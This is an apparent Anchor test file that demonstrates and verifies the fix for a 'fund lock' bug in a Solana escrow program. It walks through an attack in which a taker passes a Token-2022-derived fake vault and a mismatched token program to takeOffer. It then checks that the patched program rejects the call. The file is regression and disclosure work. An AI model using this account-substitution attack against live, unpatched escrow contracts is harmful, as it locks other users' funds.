// PoC: Fund Lock via Token Program Mismatch
// Run: anchor test (requires anchor 0.32+, solana-cli 2.1+)
//
// This test proves the vulnerability and verifies the fix.

import * as anchor from "@coral-xyz/anchor";
import { Program, BN } from "@coral-xyz/anchor";
import { AnchorEscrow2026 } from "../target/types/anchor_escrow_2026";
import {
  createMint,
  mintTo,
  getAssociatedTokenAddressSync,
  createAssociatedTokenAccount,
  getAccount,
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
} from "@solana/spl-token";
import { PublicKey, Keypair, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { assert } from "chai";

describe("PoC: Fund Lock Vulnerability", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.AnchorEscrow2026 as Program<AnchorEscrow2026>;
  const connection = provider.connection;

  const alice = Keypair.generate(); // Maker
  const bob = Keypair.generate();   // Attacker (Taker)

  let mintA: PublicKey;
  let mintB: PublicKey;
  let aliceAtaA: PublicKey;
  let aliceAtaB: PublicKey;
  let bobAtaA: PublicKey;
  let bobAtaB: PublicKey;

  const offerId = new BN(1);
  const offerAmount = new BN(100_000_000); // 100 tokens (6 decimals)
  const wantedAmount = new BN(50_000_000); // 50 tokens

  before(async () => {
    // Airdrop SOL
    await connection.confirmTransaction(
      await connection.requestAirdrop(alice.publicKey, 10 * LAMPORTS_PER_SOL)
    );
    await connection.confirmTransaction(
      await connection.requestAirdrop(bob.publicKey, 10 * LAMPORTS_PER_SOL)
    );

    // Create mints using Legacy Token Program
    mintA = await createMint(connection, alice, alice.publicKey, null, 6, undefined, undefined, TOKEN_PROGRAM_ID);
    mintB = await createMint(connection, bob, bob.publicKey, null, 6, undefined, undefined, TOKEN_PROGRAM_ID);

    // Create ATAs
    aliceAtaA = await createAssociatedTokenAccount(connection, alice, mintA, alice.publicKey, undefined, TOKEN_PROGRAM_ID);
    aliceAtaB = await createAssociatedTokenAccount(connection, alice, mintB, alice.publicKey, undefined, TOKEN_PROGRAM_ID);
    bobAtaA = await createAssociatedTokenAccount(connection, bob, mintA, bob.publicKey, undefined, TOKEN_PROGRAM_ID);
    bobAtaB = await createAssociatedTokenAccount(connection, bob, mintB, bob.publicKey, undefined, TOKEN_PROGRAM_ID);

    // Mint tokens
    await mintTo(connection, alice, mintA, aliceAtaA, alice, 1_000_000_000); // 1000 Token A to Alice
    await mintTo(connection, bob, mintB, bobAtaB, bob, 1_000_000_000);       // 1000 Token B to Bob
  });

  it("STEP 1: Alice creates an offer (escrows 100 Token A)", async () => {
    const [offerPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("offer"), offerId.toArrayLike(Buffer, "le", 8)],
      program.programId
    );
    const vault = getAssociatedTokenAddressSync(mintA, offerPda, true, TOKEN_PROGRAM_ID);

    await program.methods
      .makeOffer(offerId, offerAmount, wantedAmount)
      .accounts({
        maker: alice.publicKey,
        tokenMintA: mintA,
        tokenMintB: mintB,
        makerTokenAccountA: aliceAtaA,
        offer: offerPda,
        vault: vault,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: anchor.utils.token.ASSOCIATED_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([alice])
      .rpc();

    // Verify vault holds the escrowed tokens
    const vaultAccount = await getAccount(connection, vault);
    assert.equal(vaultAccount.amount.toString(), offerAmount.toString());
    console.log("    ✅ Vault holds", offerAmount.toString(), "Token A");
  });

  it("STEP 2: Bob attacks with Token-2022 program mismatch", async () => {
    const [offerPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("offer"), offerId.toArrayLike(Buffer, "le", 8)],
      program.programId
    );

    // The REAL vault (Legacy Token Program)
    const realVault = getAssociatedTokenAddressSync(mintA, offerPda, true, TOKEN_PROGRAM_ID);

    // The FAKE vault (Token-2022) - different address, empty
    const fakeVault = getAssociatedTokenAddressSync(mintA, offerPda, true, TOKEN_2022_PROGRAM_ID);

    console.log("    Real vault:", realVault.toBase58());
    console.log("    Fake vault:", fakeVault.toBase58());
    console.log("    (Different addresses = different ATAs)");

    // =====================================================
    // POST-FIX: This transaction should FAIL with ConstraintHasOne
    // PRE-FIX:  This transaction would SUCCEED, locking funds
    // =====================================================
    try {
      await program.methods
        .takeOffer()
        .accounts({
          taker: bob.publicKey,
          maker: alice.publicKey,
          tokenMintA: mintA,
          tokenMintB: mintB,
          takerTokenAccountA: bobAtaA,
          takerTokenAccountB: bobAtaB,
          makerTokenAccountB: aliceAtaB,
          offer: offerPda,
          vault: fakeVault,  // ATTACK: wrong vault (Token-2022 derived)
          tokenProgram: TOKEN_2022_PROGRAM_ID, // ATTACK: wrong program
          associatedTokenProgram: anchor.utils.token.ASSOCIATED_PROGRAM_ID,
          systemProgram: SystemProgram.programId,
        })
        .signers([bob])
        .rpc();

      // If we reach here, the attack succeeded (PRE-FIX behavior)
      assert.fail("VULNERABILITY CONFIRMED: Attack transaction succeeded! Funds are now locked.");
    } catch (err: any) {
      // POST-FIX: Attack is blocked
      console.log("    ✅ Attack blocked:", err.message?.substring(0, 80));
      assert.include(err.message, "ConstraintHasOne", "Expected ConstraintHasOne error from has_one = token_program");
    }
  });

  it("STEP 3: Verify Alice's funds are safe (post-fix)", async () => {
    const [offerPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("offer"), offerId.toArrayLike(Buffer, "le", 8)],
      program.programId
    );
    const vault = getAssociatedTokenAddressSync(mintA, offerPda, true, TOKEN_PROGRAM_ID);

    // Offer should still exist (attack was blocked)
    const offerAccount = await connection.getAccountInfo(offerPda);
    assert.isNotNull(offerAccount, "Offer PDA should still exist");

    // Vault should still hold the tokens
    const vaultAccount = await getAccount(connection, vault);
    assert.equal(vaultAccount.amount.toString(), offerAmount.toString());
    console.log("    ✅ Vault still holds", vaultAccount.amount.toString(), "Token A (funds safe)");
  });
});
